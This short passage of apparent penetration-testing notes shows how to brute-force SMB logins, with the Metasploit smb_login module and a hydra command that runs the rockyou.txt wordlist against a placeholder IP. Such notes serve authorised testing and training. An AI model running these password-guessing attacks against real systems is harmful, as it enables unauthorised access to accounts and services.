
### Using `metasploit`

Metasploit module to bruteforce SMB login.
```
use auxiliary/scanner/smb/smb_login
```

- Wordlist path - `/usr/share/wordlists/metasploit/unix_passwords.txt`
- Enumerate the users beforehand.

### Using `hydra`

```
hydra -l admin -P /usr/share/wordlists/rockyou.txt <IP> smb
```

- `-P` - Wordlist path.